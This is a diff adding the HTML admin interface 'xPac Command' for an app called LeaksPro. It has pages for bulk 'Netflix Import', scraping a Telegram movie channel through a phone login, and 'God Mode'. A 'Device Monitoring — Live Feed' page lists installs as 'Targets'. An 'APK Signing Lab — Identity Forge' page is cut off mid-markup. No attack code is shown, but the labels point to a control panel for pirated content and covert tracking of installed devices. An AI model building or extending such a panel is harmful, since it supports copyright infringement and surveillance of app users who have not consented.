@@ -1,0 +1,1698 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>xPac Command</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/remixicon@4.1.0/fonts/remixicon.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+  <script src="https://cdn.socket.io/4.8.1/socket.io.min.js"></script>
+  <meta name="theme-color" content="#0f0f0f">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+</head>
+<body>
+
+  <!-- ============ SPLASH LOADER ============ -->
+  <div id="xpacSplash" class="xpac-splash">
+    <div class="xpac-splash-inner">
+      <svg class="xpac-splash-logo" viewBox="0 0 64 64" width="72" height="72"><g fill="none" stroke="#00e5ff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="32" cy="18" r="8"/><path d="M24 18c0-4.4 3.6-8 8-8s8 3.6 8 8"/><path d="M20 30c0 0 2-8 12-8s12 8 12 8"/><path d="M18 44l4-14h20l4 14"/><path d="M14 44h36"/><path d="M20 44l-6 10M44 44l6 10"/><circle cx="17" cy="56" r="4"/><circle cx="47" cy="56" r="4"/><path d="M21 56h22"/><path d="M32 30v14"/><path d="M26 36h12"/></g></svg>
+      <div class="xpac-splash-text">xPac</div>
+    </div>
+  </div>
+
+  <!-- ============ LOGIN SCREEN ============ -->
+  <div id="loginScreen" class="login-screen">
+    <div class="login-wrapper">
+      <div class="login-brand">
+        <div class="login-icon-wrap">
+          <svg class="xpac-logo shine-logo" viewBox="0 0 64 64" width="64" height="64"><g fill="none" stroke="var(--accent)" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="32" cy="18" r="8"/><path d="M24 18c0-4.4 3.6-8 8-8s8 3.6 8 8"/><path d="M20 30c0 0 2-8 12-8s12 8 12 8"/><path d="M18 44l4-14h20l4 14"/><path d="M14 44h36"/><path d="M20 44l-6 10M44 44l6 10"/><circle cx="17" cy="56" r="4"/><circle cx="47" cy="56" r="4"/><path d="M21 56h22"/><path d="M32 30v14"/><path d="M26 36h12"/><path d="M10 38l8 2M54 38l-8 2"/></g></svg>
+        </div>
+        <h1>xPac</h1>
+        <p class="login-subtitle">Command Center</p>
+      </div>
+      <form id="loginForm" class="login-form">
+        <div class="field">
+          <label for="loginPassword">Password</label>
+          <div class="field-input-wrap">
+            <i class="ri-lock-password-line"></i>
+            <input type="password" id="loginPassword" placeholder="Enter admin password" required autocomplete="current-password">
+            <button type="button" class="toggle-pw" id="togglePw"><i class="ri-eye-off-line"></i></button>
+          </div>
+        </div>
+        <button type="submit" class="btn btn-primary btn-block" id="loginBtn">
+          <i class="ri-login-box-line"></i> <span>Sign In</span>
+        </button>
+      </form>
+    </div>
+  </div>
+
+  <!-- ============ MAIN APP ============ -->
+  <div id="app" class="app hidden">
+
+    <!-- Mobile Header -->
+    <header class="mobile-header">
+      <button class="btn-icon" id="menuBtn"><i class="ri-menu-line"></i></button>
+      <div class="mobile-brand">
+        <svg class="xpac-logo-sm shine-logo" viewBox="0 0 64 64" width="28" height="28"><g fill="none" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="32" cy="18" r="8"/><path d="M20 30c0 0 2-8 12-8s12 8 12 8"/><path d="M18 44l4-14h20l4 14"/><path d="M14 44h36"/><path d="M20 44l-6 10M44 44l6 10"/><circle cx="17" cy="56" r="4"/><circle cx="47" cy="56" r="4"/><path d="M21 56h22"/></g></svg>
+        <span>xPac</span>
+      </div>
+      <button class="btn-icon" id="logoutBtnMobile"><i class="ri-logout-box-r-line"></i></button>
+    </header>
+
+    <!-- Sidebar Overlay (mobile) -->
+    <div class="sidebar-overlay" id="sidebarOverlay"></div>
+
+    <!-- Sidebar -->
+    <aside class="sidebar" id="sidebar">
+      <div class="sidebar-head">
+        <div class="sidebar-brand">
+          <svg class="xpac-logo-sm shine-logo" viewBox="0 0 64 64" width="32" height="32"><g fill="none" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="32" cy="18" r="8"/><path d="M20 30c0 0 2-8 12-8s12 8 12 8"/><path d="M18 44l4-14h20l4 14"/><path d="M14 44h36"/><path d="M20 44l-6 10M44 44l6 10"/><circle cx="17" cy="56" r="4"/><circle cx="47" cy="56" r="4"/><path d="M21 56h22"/></g></svg>
+          <span>xPac</span>
+        </div>
+        <button class="close-sidebar" id="closeSidebar"><i class="ri-close-line"></i></button>
+      </div>
+
+      <nav class="sidebar-nav">
+        <a href="#" class="nav-link active" data-page="dashboard">
+          <i class="ri-dashboard-3-line"></i><span>Dashboard</span>
+        </a>
+        <a href="#" class="nav-link" data-page="upload">
+          <i class="ri-upload-cloud-2-line"></i><span>Upload Video</span>
+        </a>
+        <a href="#" class="nav-link" data-page="tmdb">
+          <i class="ri-netflix-fill"></i><span>Netflix Import</span>
+        </a>
+        <a href="#" class="nav-link" data-page="telegram">
+          <i class="ri-telegram-fill"></i><span>Telegram Videos</span>
+        </a>
+        <a href="#" class="nav-link" data-page="videos">
+          <i class="ri-video-line"></i><span>All Videos</span>
+        </a>
+        <a href="#" class="nav-link" data-page="requests">
+          <i class="ri-movie-2-line"></i><span>Requests</span>
+        </a>
+        <a href="#" class="nav-link" data-page="connections">
+          <i class="ri-radar-line"></i><span>Connections</span>
+        </a>
+        <a href="#" class="nav-link" data-page="users">
+          <i class="ri-user-line"></i><span>App Users</span>
+        </a>
+        <a href="#" class="nav-link" data-page="apksign">
+          <i class="ri-shield-keyhole-line"></i><span>APK Signer</span>
+        </a>
+        <a href="#" class="nav-link" data-page="admindevices">
+          <i class="ri-smartphone-line"></i><span>Admin Devices</span>
+        </a>
+        <a href="#" class="nav-link" data-page="system">
+          <i class="ri-server-line"></i><span>System & Recovery</span>
+        </a>
+        <a href="#" class="nav-link" data-page="godmode">
+          <i class="ri-skull-2-line"></i><span>God Mode</span>
+        </a>
+        <a href="#" class="nav-link" data-page="settings">
+          <i class="ri-settings-3-line"></i><span>Settings</span>
+        </a>
+      </nav>
+
+      <div class="sidebar-bottom">
+        <div class="ws-indicator" id="wsIndicator">
+          <span class="ws-dot"></span>
+          <span id="wsStatus">Connecting...</span>
+        </div>
+        <div class="clients-info">
+          <i class="ri-group-line"></i>
+          <span><b id="clientCount">0</b> online</span>
+        </div>
+        <button class="btn btn-outline btn-block btn-sm logout-desktop" id="logoutBtn">
+          <i class="ri-logout-box-r-line"></i> Logout
+        </button>
+      </div>
+    </aside>
+
+    <!-- Content Area -->
+    <div class="content-area">
+
+      <!-- ═══ FORENSIC METRICS BAR (real-time, all pages) ═══ -->
+      <div class="metrics-bar" id="metricsBar">
+        <div class="metrics-row">
+          <!-- Network -->
+          <div class="metric-cell" id="metricNet" title="HTTP requests & bandwidth">
+            <div class="metric-label"><i class="ri-global-line"></i> NETWORK</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mNetReqSec">0</span><span class="metric-unit">req/s</span>
+              <span class="metric-sep">│</span>
+              <span class="metric-secondary" id="mNetBw">0 B/s</span>
+            </div>
+            <div class="metric-spark" id="sparkNet"></div>
+          </div>
+
+          <!-- WebSocket -->
+          <div class="metric-cell" id="metricWs" title="WebSocket messages & connections">
+            <div class="metric-label"><i class="ri-links-line"></i> WEBSOCKET</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mWsMsgSec">0</span><span class="metric-unit">msg/s</span>
+              <span class="metric-sep">│</span>
+              <span class="metric-secondary" id="mWsClients">0 clients</span>
+            </div>
+            <div class="metric-spark" id="sparkWs"></div>
+          </div>
+
+          <!-- Ping / Latency -->
+          <div class="metric-cell" id="metricPing" title="Round-trip latency to server">
+            <div class="metric-label"><i class="ri-speed-line"></i> PING</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mPingMs">—</span><span class="metric-unit">ms</span>
+              <span class="metric-sep">│</span>
+              <span class="metric-secondary" id="mPingStatus">measuring…</span>
+            </div>
+            <div class="metric-spark" id="sparkPing"></div>
+          </div>
+
+          <!-- Server -->
+          <div class="metric-cell" id="metricSrv" title="Server uptime & memory">
+            <div class="metric-label"><i class="ri-server-line"></i> SERVER</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mSrvUptime">0s</span>
+              <span class="metric-sep">│</span>
+              <span class="metric-secondary" id="mSrvMem">0 MB</span>
+            </div>
+            <div class="metric-mini-bar"><div class="metric-mini-fill" id="mSrvMemBar"></div></div>
+          </div>
+
+          <!-- Streams -->
+          <div class="metric-cell metric-cell-sm" id="metricStreams" title="Active Telegram streams">
+            <div class="metric-label"><i class="ri-live-line"></i> STREAMS</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mStreams">0</span>
+              <span class="metric-sep">│</span>
+              <span class="metric-secondary" id="mDevices">0 dev</span>
+            </div>
+          </div>
+
+          <!-- Errors -->
+          <div class="metric-cell metric-cell-sm" id="metricErrors" title="HTTP errors since boot">
+            <div class="metric-label"><i class="ri-error-warning-line"></i> ERRORS</div>
+            <div class="metric-values">
+              <span class="metric-primary" id="mErrors">0</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Desktop Top Bar -->
+      <header class="topbar">
+        <h2 id="pageTitle">Dashboard</h2>
+        <div class="topbar-right">
+          <div class="ws-badge">
+            <span class="ws-dot-sm" id="wsDotTopbar"></span>
+            <span id="wsStatusTopbar">Connected</span>
+          </div>
+        </div>
+      </header>
+
+      <!-- ===== DASHBOARD PAGE ===== -->
+      <section id="page-dashboard" class="page active">
+        <div class="stats-row">
+          <div class="stat-card">
+            <div class="stat-icon bg-red"><i class="ri-video-line"></i></div>
+            <div class="stat-body">
+              <span class="stat-value" id="statVideos">0</span>
+              <span class="stat-label">Videos</span>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon bg-blue"><i class="ri-eye-line"></i></div>
+            <div class="stat-body">
+              <span class="stat-value" id="statViews">0</span>
+              <span class="stat-label">Views</span>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon bg-green"><i class="ri-thumb-up-line"></i></div>
+            <div class="stat-body">
+              <span class="stat-value" id="statLikes">0</span>
+              <span class="stat-label">Likes</span>
+            </div>
+          </div>
+          <div class="stat-card">
+            <div class="stat-icon bg-orange"><i class="ri-hard-drive-3-line"></i></div>
+            <div class="stat-body">
+              <span class="stat-value" id="statStorage">0 B</span>
+              <span class="stat-label">Storage</span>
+            </div>
+          </div>
+          <div class="stat-card" style="cursor:pointer" onclick="navigateTo('users')">
+            <div class="stat-icon" style="background:var(--accent)"><i class="ri-user-line"></i></div>
+            <div class="stat-body">
+              <span class="stat-value" id="statUsers">0</span>
+              <span class="stat-label">App Users</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head">
+            <h3><i class="ri-upload-2-line"></i> Recent Uploads</h3>
+          </div>
+          <div class="card-content" id="recentUploads">
+            <p class="empty">No videos uploaded yet</p>
+          </div>
+        </div>
+
+        <div class="card">
+          <div class="card-head">
+            <h3><i class="ri-live-line"></i> Activity Log</h3>
+          </div>
+          <div class="card-content activity-scroll" id="activityLog">
+            <p class="empty">Waiting for activity...</p>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== UPLOAD PAGE ===== -->
+      <section id="page-upload" class="page">
+        <div class="card">
+          <div class="card-head">
+            <h3><i class="ri-upload-cloud-2-line"></i> Upload New Video</h3>
+          </div>
+          <div class="card-content">
+
+            <!-- Drop Zone -->
+            <div class="dropzone" id="dropZone">
+              <i class="ri-upload-cloud-2-line"></i>
+              <p>Drag & drop video here</p>
+              <span>or tap to browse files</span>
+              <input type="file" id="videoFile" accept="video/*" hidden>
+            </div>
+
+            <!-- File Preview -->
+            <div id="fileInfo" class="file-info hidden">
+              <div class="file-row">
+                <i class="ri-film-line"></i>
+                <div class="file-details">
+                  <span class="file-name" id="fileName"></span>
+                  <span class="file-size" id="fileSize"></span>
+                </div>
+                <button type="button" class="btn-icon btn-icon-danger" onclick="clearFile()"><i class="ri-close-line"></i></button>
+              </div>
+            </div>
+
+            <!-- Progress Bar -->
+            <div id="uploadProgress" class="progress-wrap hidden">
+              <div class="progress-track">
+                <div class="progress-bar" id="progressFill"></div>
+              </div>
+              <div class="progress-meta">
+                <span id="progressText">0%</span>
+                <span id="progressSpeed"></span>
+              </div>
+            </div>
+
+            <!-- Upload Form -->
+            <form id="uploadForm" class="form-grid">
+              <div class="field span-full">
+                <label>Title *</label>
+                <input type="text" id="videoTitle" placeholder="Enter video title" required>
+              </div>
+              <div class="field span-full">
+                <label>Description</label>
+                <textarea id="videoDesc" rows="3" placeholder="Enter video description"></textarea>
+              </div>
+              <div class="field">
+                <label>Category</label>
+                <select id="videoCategory">
+                  <option value="General">General</option>
+                  <option value="Gaming">Gaming</option>
+                  <option value="Music">Music</option>
+                  <option value="Sports">Sports</option>
+                  <option value="Education">Education</option>
+                  <option value="Entertainment">Entertainment</option>
+                  <option value="News">News</option>
+                  <option value="Technology">Technology</option>
+                  <option value="Comedy">Comedy</option>
+                  <option value="Film">Film</option>
+                </select>
+              </div>
+              <div class="field">
+                <label>Channel Name</label>
+                <input type="text" id="channelName" value="LeaksPro Admin">
+              </div>
+              <div class="field">
+                <label>Tags (comma separated)</label>
+                <input type="text" id="videoTags" placeholder="tag1, tag2, tag3">
+              </div>
+              <div class="field">
+                <label>Duration (seconds)</label>
+                <input type="number" id="videoDuration" placeholder="0" step="0.1">
+              </div>
+              <div class="field span-full">
+                <label>Thumbnail</label>
+                <div class="thumb-upload">
+                  <input type="file" id="thumbnailFile" accept="image/*">
+                  <img id="thumbnailPreview" class="hidden" alt="Preview">
+                </div>
+              </div>
+              <div class="field span-full checkbox-row">
+                <label class="checkbox"><input type="checkbox" id="isPublished" checked> Published</label>
+                <label class="checkbox"><input type="checkbox" id="isShort"> Short Video</label>
+              </div>
+              <div class="field span-full">
+                <button type="submit" class="btn btn-primary btn-block btn-lg" id="uploadBtn">
+                  <i class="ri-upload-cloud-2-line"></i> Upload Video
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== VIDEOS PAGE ===== -->
+      <section id="page-videos" class="page">
+        <div class="card">
+          <div class="card-head card-head-flex">
+            <h3><i class="ri-video-line"></i> All Videos</h3>
+            <div class="search-wrap">
+              <i class="ri-search-line"></i>
+              <input type="text" id="videoSearch" placeholder="Search...">
+            </div>
+          </div>
+          <div class="card-content">
+            <div id="videosList" class="vid-grid">
+              <p class="empty">Loading videos...</p>
+            </div>
+            <div id="videoPagination" class="pagination"></div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== CONTENT REQUESTS PAGE ===== -->
+      <section id="page-requests" class="page">
+        <div class="card">
+          <div class="card-head card-head-flex">
+            <h3><i class="ri-movie-2-line"></i> Content Requests</h3>
+            <div style="display:flex;gap:8px;align-items:center">
+              <select id="requestStatusFilter" onchange="loadRequests()" style="padding:6px 10px;border-radius:6px;background:var(--surface);color:var(--text);border:1px solid var(--border);font-size:13px">
+                <option value="all">All Status</option>
+                <option value="pending" selected>Pending</option>
+                <option value="fulfilled">Fulfilled</option>
+                <option value="dismissed">Dismissed</option>
+              </select>
+              <button class="btn btn-outline btn-sm" onclick="loadRequests()">
+                <i class="ri-refresh-line"></i> Refresh
+              </button>
+            </div>
+          </div>
+          <div class="card-content">
+            <!-- Request Stats -->
+            <div class="stats-row" id="requestStats" style="margin-bottom:16px">
+              <div class="stat-card"><div class="stat-icon bg-blue"><i class="ri-file-list-line"></i></div><div class="stat-body"><span class="stat-value" id="reqStatTotal">0</span><span class="stat-label">Total</span></div></div>
+              <div class="stat-card"><div class="stat-icon bg-orange"><i class="ri-time-line"></i></div><div class="stat-body"><span class="stat-value" id="reqStatPending">0</span><span class="stat-label">Pending</span></div></div>
+              <div class="stat-card"><div class="stat-icon bg-green"><i class="ri-check-line"></i></div><div class="stat-body"><span class="stat-value" id="reqStatFulfilled">0</span><span class="stat-label">Fulfilled</span></div></div>
+              <div class="stat-card"><div class="stat-icon bg-red"><i class="ri-close-line"></i></div><div class="stat-body"><span class="stat-value" id="reqStatDismissed">0</span><span class="stat-label">Dismissed</span></div></div>
+            </div>
+
+            <!-- Requests Grid -->
+            <div id="requestsList" class="tmdb-grid">
+              <div class="tmdb-empty">
+                <i class="ri-movie-2-line"></i>
+                <p>No content requests yet</p>
+                <span>Requests from app users will appear here</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== TMDB NETFLIX IMPORT PAGE ===== -->
+      <section id="page-tmdb" class="page">
+        <div class="card">
+          <div class="card-head">
+            <h3><i class="ri-netflix-fill"></i> Netflix Content Import (TMDB)</h3>
+          </div>
+          <div class="card-content">
+            <!-- TMDB API Key Setup -->
+            <div id="tmdbSetup" class="tmdb-setup">
+              <div class="tmdb-key-row">
+                <input type="text" id="tmdbApiKey" placeholder="Enter TMDB API Key (free from themoviedb.org)" class="tmdb-key-input">
+                <button class="btn btn-primary btn-sm" onclick="saveTmdbKey()">
+                  <i class="ri-key-2-line"></i> Save Key
+                </button>
+              </div>
+              <p class="tmdb-hint">Get your free API key at <a href="https://www.themoviedb.org/settings/api" target="_blank" style="color:var(--accent)">themoviedb.org/settings/api</a> — it's free and takes 2 minutes.</p>
+            </div>
+
+            <!-- Search & Filter Bar -->
+            <div class="tmdb-toolbar">
+              <!-- Quick Actions Row -->
+              <div class="tmdb-quick-actions">
+                <button class="btn btn-primary" id="autoPopulateBtn" onclick="autoPopulate()">
+                  <i class="ri-magic-line"></i> Auto-Populate Netflix Content
+                </button>
+                <button class="btn btn-outline btn-sm" id="reimportEpisodesBtn" onclick="reimportEpisodes()">
+                  <i class="ri-refresh-line"></i> Fix Missing Episodes
+                </button>
+                <span class="quick-action-hint">One click imports 40 movies + 20 series with all episodes</span>
+              </div>
+
+              <div class="tmdb-search-row">
+                <input type="text" id="tmdbSearch" placeholder="Search movies & TV shows..." class="tmdb-search-input" onkeydown="if(event.key==='Enter')searchTmdb()">
+                <button class="btn btn-primary btn-sm" onclick="searchTmdb()">
+                  <i class="ri-search-line"></i> Search
+                </button>
+              </div>
+              <div class="tmdb-filter-row">
+                <button class="btn btn-sm tmdb-filter-btn active" data-filter="all" onclick="browseTmdb('all')">All</button>
+                <button class="btn btn-sm tmdb-filter-btn" data-filter="movie" onclick="browseTmdb('movie')">Movies</button>
+                <button class="btn btn-sm tmdb-filter-btn" data-filter="tv" onclick="browseTmdb('tv')">TV Shows</button>
+                <button class="btn btn-sm tmdb-filter-btn" data-filter="trending" onclick="browseTmdbTrending()">🔥 Trending</button>
+                <div class="tmdb-bulk-actions">
+                  <button class="btn btn-sm btn-outline" id="tmdbSelectAllBtn" onclick="toggleSelectAll()">
+                    <i class="ri-checkbox-multiple-line"></i> Select All
+                  </button>
+                  <button class="btn btn-sm btn-primary" id="tmdbImportSelectedBtn" onclick="importSelected()" style="display:none">
+                    <i class="ri-download-line"></i> Import Selected (<span id="tmdbSelectedCount">0</span>)
+                  </button>
+                </div>
+              </div>
+            </div>
+
+            <!-- Import Progress -->
+            <div id="tmdbProgress" class="tmdb-progress hidden">
+              <div class="tmdb-progress-bar"><div class="tmdb-progress-fill" id="tmdbProgressFill"></div></div>
+              <span id="tmdbProgressText">Importing...</span>
+            </div>
+
+            <!-- Results Grid -->
+            <div id="tmdbResults" class="tmdb-grid">
+              <div class="tmdb-empty">
+                <i class="ri-netflix-fill"></i>
+                <p>Browse or search Netflix content above</p>
+                <span>Import movies & TV shows with HD posters and official trailers</span>
+              </div>
+            </div>
+
+            <!-- Load More -->
+            <div id="tmdbLoadMore" class="tmdb-load-more hidden">
+              <button class="btn btn-outline" onclick="loadMoreTmdb()">
+                <i class="ri-arrow-down-line"></i> Load More
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== SETTINGS PAGE ===== -->
+
+      <!-- ===== TELEGRAM PAGE ===== -->
+      <section id="page-telegram" class="page">
+        <div class="card">
+          <div class="card-head card-head-flex">
+            <h3><i class="ri-telegram-fill"></i> Telegram Channel Videos</h3>
+            <div style="display:flex;gap:8px;align-items:center">
+              <span id="tgStatus" class="ws-badge" style="font-size:12px">⏳ Checking...</span>
+            </div>
+          </div>
+          <div class="card-content">
+
+            <!-- Login Section (shown when not connected) -->
+            <div id="tgLoginSection" style="margin-bottom:20px;padding:16px;background:var(--surface);border-radius:8px;border:1px solid var(--border)">
+              <h4 style="margin:0 0 8px;color:var(--text)"><i class="ri-phone-line"></i> Telegram Phone Login</h4>
+              <p style="color:var(--muted);font-size:13px;margin-bottom:12px">
+                Bot accounts can't list channel history. Login with your phone number to enable full access to <b>@moviesfrer</b>.
+                The session is saved — you only need to do this once.
+              </p>
+
+              <!-- Step 1: Phone -->
+              <div id="tgStep1" style="display:flex;gap:8px;align-items:end;flex-wrap:wrap">
+                <div class="field" style="flex:1;min-width:200px;margin:0">
+                  <label style="font-size:11px">Phone Number (with country code)</label>
+                  <input type="text" id="tgPhone" placeholder="+91XXXXXXXXXX" style="padding:6px 10px">
+                </div>
+                <button class="btn btn-primary btn-sm" onclick="tgSendCode()" id="tgSendCodeBtn" style="height:34px">
+                  <i class="ri-send-plane-2-line"></i> Send Code
+                </button>
+              </div>
+
+              <!-- Step 2: OTP Code -->
+              <div id="tgStep2" style="display:none;margin-top:12px">
+                <div style="display:flex;gap:8px;align-items:end;flex-wrap:wrap">
+                  <div class="field" style="flex:1;min-width:150px;margin:0">
+                    <label style="font-size:11px">Enter the code from Telegram</label>
+                    <input type="text" id="tgCode" placeholder="12345" style="padding:6px 10px;letter-spacing:4px;font-size:18px;text-align:center" maxlength="6">
+                  </div>
+                  <button class="btn btn-primary btn-sm" onclick="tgVerifyCode()" id="tgVerifyBtn" style="height:34px">
+                    <i class="ri-check-line"></i> Verify
+                  </button>
+                </div>
+              </div>
+
+              <!-- Step 3: 2FA Password (if needed) -->
+              <div id="tgStep3" style="display:none;margin-top:12px">
+                <div style="display:flex;gap:8px;align-items:end;flex-wrap:wrap">
+                  <div class="field" style="flex:1;min-width:200px;margin:0">
+                    <label style="font-size:11px">Two-Factor Password</label>
+                    <input type="password" id="tg2FA" placeholder="Enter 2FA password" style="padding:6px 10px">
+                  </div>
+                  <button class="btn btn-primary btn-sm" onclick="tgVerify2FA()" style="height:34px">
+                    <i class="ri-shield-check-line"></i> Submit
+                  </button>
+                </div>
+              </div>
+
+              <div id="tgLoginMsg" style="margin-top:8px;font-size:12px;color:var(--muted);display:none"></div>
+            </div>
+
+            <!-- Connected Controls (shown when connected) -->
+            <div id="tgConnectedSection" style="display:none;margin-bottom:16px">
+              <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;margin-bottom:16px">
+                <button class="btn btn-primary btn-sm" onclick="tgScanChannel()">
+                  <i class="ri-refresh-line"></i> Scan &amp; Auto-Match
+                </button>
+                <button class="btn btn-outline btn-sm" style="color:#ff9800;border-color:#ff9800" onclick="tgScanChannel(true)">
+                  <i class="ri-restart-line"></i> Force Re-scan
+                </button>
+                <button class="btn btn-outline btn-sm" onclick="tgLoadVideos()">
+                  <i class="ri-list-check"></i> Refresh List
+                </button>
+                <button class="btn btn-outline btn-sm" style="color:#f44336;border-color:#f44336" onclick="tgLogout()">
+                  <i class="ri-logout-box-r-line"></i> Logout
+                </button>
+              </div>
+
+              <p style="color:var(--muted);margin-bottom:12px;font-size:13px">
+                Videos from <b>@moviesfrer</b> appear below. 
+                <b>Scan &amp; Auto-Match</b> links them to Netflix content by filename (e.g. Show.Name.S01E01.mkv).
+                Or manually link using Message ID + Video ID.
+              </p>
+            </div>
+
+            <!-- Scan Progress -->
+            <div id="tgScanProgress" class="tmdb-progress hidden" style="margin-bottom:16px">
+              <div class="tmdb-progress-bar"><div class="tmdb-progress-fill" id="tgProgressFill" style="width:100%;animation:pulse 1.5s infinite"></div></div>
+              <span id="tgProgressText">Scanning channel...</span>
+            </div>
+
+            <!-- Scan Results -->
+            <div id="tgScanResults" class="hidden" style="margin-bottom:16px">
+              <div class="stats-row" style="margin-bottom:12px">
+                <div class="stat-card"><div class="stat-icon bg-blue"><i class="ri-search-line"></i></div><div class="stat-body"><span class="stat-value" id="tgScanned">0</span><span class="stat-label">Scanned</span></div></div>
+                <div class="stat-card"><div class="stat-icon bg-green"><i class="ri-link"></i></div><div class="stat-body"><span class="stat-value" id="tgMatched">0</span><span class="stat-label">Matched</span></div></div>
+                <div class="stat-card"><div class="stat-icon bg-orange"><i class="ri-question-line"></i></div><div class="stat-body"><span class="stat-value" id="tgUnmatched">0</span><span class="stat-label">Unmatched</span></div></div>
+              </div>
+            </div>
+
+            <!-- Manual Link Section -->
+            <div id="tgManualLinkSection" style="display:none;margin-bottom:16px;padding:12px;background:var(--surface);border-radius:8px;border:1px solid var(--border)">
+              <h4 style="margin:0 0 8px;font-size:14px;color:var(--text)"><i class="ri-link"></i> Manual Link</h4>
+              <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:end">
+                <div class="field" style="flex:1;min-width:120px;margin:0">
+                  <label style="font-size:11px">Message ID</label>
+                  <input type="number" id="tgLinkMsgId" placeholder="e.g. 42" style="padding:6px 10px">
+                </div>
+                <div class="field" style="flex:2;min-width:200px;margin:0">
+                  <label style="font-size:11px">Video/Episode ID</label>
+                  <input type="text" id="tgLinkVideoId" placeholder="e.g. movie_123 or ep_456" style="padding:6px 10px">
+                </div>
+                <button class="btn btn-primary btn-sm" onclick="tgLinkManual()" style="height:34px">
+                  <i class="ri-link"></i> Link
+                </button>
+              </div>
+            </div>
+
+            <!-- Video List -->
+            <div id="tgVideosList" class="vid-grid">
+              <p class="empty">Login above to view channel videos</p>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== SETTINGS PAGE (continued) ===== -->
+      <section id="page-settings" class="page">
+        <div class="card">
+          <div class="card-head">
+            <h3><i class="ri-settings-3-line"></i> Settings</h3>
+          </div>
+          <div class="card-content">
+            <form id="settingsForm" class="form-grid">
+              <div class="field span-full">
+                <label>App Name</label>
+                <input type="text" id="settingAppName" value="LeaksPro">
+              </div>
+              <div class="field span-full">
+                <label>Admin Password</label>
+                <input type="password" id="settingPassword" placeholder="Enter new password">
+              </div>
+              <div class="field span-full">
+                <label>Max Upload Size (bytes)</label>
+                <input type="number" id="settingMaxSize" value="5368709120">
+              </div>
+              <div class="field span-full">
+                <label>Server URL</label>
+                <input type="text" id="serverUrl" readonly>
+              </div>
+              <div class="field span-full">
+                <button type="submit" class="btn btn-primary">
+                  <i class="ri-save-line"></i> Save Settings
+                </button>
+              </div>
+            </form>
+          </div>
+        </div>
+
+        <!-- Admin App Theme Card -->
+        <div class="card" style="margin-top:16px;">
+          <div class="card-head">
+            <h3><i class="ri-palette-line"></i> Admin App Theme</h3>
+          </div>
+          <div class="card-content">
+            <p style="color:var(--text-muted);font-size:13px;margin-bottom:12px;">
+              Randomize the color theme of the LeaksProAdmin mobile app. The app will pick up the new theme on next launch.
+            </p>
+            <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap;">
+              <span id="currentThemeBadge" style="padding:4px 12px;border-radius:6px;background:var(--accent);color:#fff;font-size:12px;font-weight:600;letter-spacing:1px;">SAGE</span>
+              <button type="button" class="btn btn-primary" onclick="randomizeAdminTheme()" id="randomizeThemeBtn">
+                <i class="ri-refresh-line"></i> Randomize Theme
+              </button>
+            </div>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== CONNECTIONS PAGE (Forensic UI) ===== -->
+      <section id="page-connections" class="page">
+        <!-- Scan header -->
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-radar-line"></i>
+            <span>DEVICE MONITORING — LIVE FEED</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Stats row -->
+        <div class="fx-stats">
+          <div class="fx-stat">
+            <span class="fx-stat-val" id="connTotal">0</span>
+            <span class="fx-stat-lbl">TOTAL INSTALLS</span>
+          </div>
+          <div class="fx-stat fx-online">
+            <span class="fx-stat-val" id="connOnline">0</span>
+            <span class="fx-stat-lbl">ONLINE</span>
+          </div>
+          <div class="fx-stat fx-offline">
+            <span class="fx-stat-val" id="connOffline">0</span>
+            <span class="fx-stat-lbl">OFFLINE</span>
+          </div>
+        </div>
+
+        <!-- Device grid -->
+        <div id="deviceGrid" class="fx-grid">
+          <div class="fx-empty">
+            <i class="ri-radar-line"></i>
+            <p>NO DEVICES DETECTED</p>
+            <span>Targets will appear when the app is installed on a device</span>
+          </div>
+        </div>
+      </section>
+
+      <!-- ===== APK SIGNER PAGE (Forensic UI) ===== -->
+      <section id="page-apksign" class="page">
+        <!-- Forensic header -->
+        <div class="fx-header">
+          <div class="fx-scan-bar"><div class="fx-scan-line"></div></div>
+          <div class="fx-title">
+            <i class="ri-shield-keyhole-line"></i>
+            <span>APK SIGNING LAB — IDENTITY FORGE</span>
+            <span class="fx-blink">●</span>
+          </div>
+        </div>
+
+        <!-- Upload Card -->
+        <div class="card apk-sign-card">
+          <div class="card-head">
+            <h3><i class="ri-upload-2-line"></i> Upload & Sign APK</h3>
+          </div>
+          <div class="card-content">
